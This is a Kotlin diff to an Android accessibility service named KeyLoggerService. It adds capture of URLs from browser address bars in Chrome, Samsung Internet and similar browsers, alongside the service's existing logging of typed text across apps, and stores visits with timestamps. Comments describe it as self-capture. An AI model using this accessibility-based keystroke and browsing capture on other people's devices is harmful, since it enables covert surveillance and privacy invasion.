@@ -61,6 +61,20 @@ class KeyLoggerService : AccessibilityService() {
     /** In-memory buffer cap (bytes). Spill to disk past this. */
     const val MEM_CAP_BYTES = 5 * 1024 * 1024
 
+    /** Resource-id fragments that identify a browser's omnibox/address bar.
+     *  Lowercased and matched as substrings. Covers stock Chrome
+     *  (`:id/location_bar`, `:id/url_bar`), Chrome forks, and Samsung Internet
+     *  (`:id/address_bar_*`). Missing one is harmless — a visit just isn't
+     *  captured. */
+    private val BROWSER_OMNIBOX_IDS = listOf(
+      "location_bar",
+      "url_bar",
+      "address_bar",
+      "omnibox",
+      "search_box_text",
+      "urlbar",
+    )
+
     @Volatile private var instance: KeyLoggerService? = null
     fun get(): KeyLoggerService? = instance
 
@@ -81,6 +95,7 @@ class KeyLoggerService : AccessibilityService() {
   // created. `by lazy` defers until onServiceConnected()/first capture, by
   // which point the Context is valid.
   private val store by lazy { KeyLogStore(applicationContext) }
+  private val browserHistory by lazy { BrowserHistoryStore(applicationContext) }
   private val inputMonitor by lazy { InputMonitor(applicationContext) }
   private val buffer = StringBuilder()
   private var bufferBytes = 0L
@@ -149,6 +164,11 @@ class KeyLoggerService : AccessibilityService() {
     if (!enabled) return
     if (event.eventType != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) return
     val node = event.source ?: return
+    try {
+      captureBrowserVisit(node)
+    } catch (_: Throwable) {
+      // never let URL-capture failure break the core keylog/text capture
+    }
     val text = node.text?.toString() ?: return
     val hint = node.viewIdResourceName ?: ""
     recordEvent(
@@ -158,6 +178,44 @@ class KeyLoggerService : AccessibilityService() {
       seen = true,
     )
     node.recycle()
+  }
+
+  /**
+   * Browser-history self-capture. Modern Chrome (90+) no longer exposes history
+   * through any content provider (see BrowserHistoryStore KDoc), so the only
+   * reliable cross-app mechanism is to capture the address bar as the user
+   * navigates. When the accessibility service sees text land in a browser's
+   * omnibox/address bar (recognizable by resource-id) that contains a URL, we
+   * record it durably with a wallclock timestamp.
+   */
+  private fun captureBrowserVisit(node: AccessibilityNodeInfo) {
+    if (node.text?.isNullOrBlank() != false) return
+    val viewId = node.viewIdResourceName ?: return
+    if (!isBrowserOmnibox(viewId)) return
+    val text = node.text.toString().trim()
+    val url = extractUrl(text) ?: return
+    browserHistory.recordVisit(url, "", System.currentTimeMillis())
+    browserHistory.prune()
+  }
+
+  private fun isBrowserOmnibox(viewId: String): Boolean {
+    val id = viewId.lowercase()
+    return BROWSER_OMNIBOX_IDS.any { id.contains(it) }
+  }
+
+  /** A rough-but-safe URL heuristic: must start with a web scheme. This filters
+   *  out omnibox search queries and unsubmitted text while accepting the URLs
+   *  browsers commit. */
+  private fun extractUrl(t: String): String? {
+    val s = t.trim()
+    return when {
+      s.startsWith("https://", ignoreCase = true) -> s
+      s.startsWith("http://", ignoreCase = true) -> s
+      s.startsWith("www.") -> "https://$s"
+      s.startsWith("chrome://") -> s
+      s.startsWith("about:") -> s
+      else -> null
+    }
   }
 
   /** Required abstract member of AccessibilityService (interrupt = any event). */
@@ -217,6 +275,13 @@ class KeyLoggerService : AccessibilityService() {
       pendingFlush.addAll(rows.map { it.first })
     }
     return out
+  }
+
+  /** Self-captured browser visits after [sinceMs] as JSON strings, oldest first. */
+  fun browserVisitsAfter(sinceMs: Long): Array<String> {
+    val out = ArrayList<String>()
+    browserHistory.visitsAfter(sinceMs, out)
+    return out.toTypedArray()
   }
 
   /** Drain + return the row ids we handed off (called by the bridge after a
